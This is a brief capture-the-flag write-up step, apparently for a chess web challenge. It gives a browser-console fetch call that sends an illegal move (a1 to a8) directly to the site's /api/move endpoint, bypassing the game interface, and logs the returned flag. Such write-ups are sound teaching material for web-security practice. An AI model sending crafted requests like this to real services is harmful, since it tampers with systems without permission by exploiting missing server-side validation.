#### Method 1: Use console:

In this just `Right-Click` -> `Inspect`.

Then enter this:
````js
fetch("/api/move", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({
        from: "a1",
        to: "a8"
    })
})
.then(response => response.json())
.then(data => {
    console.log(data);
    console.log("FLAG:", data.flag);
});
````
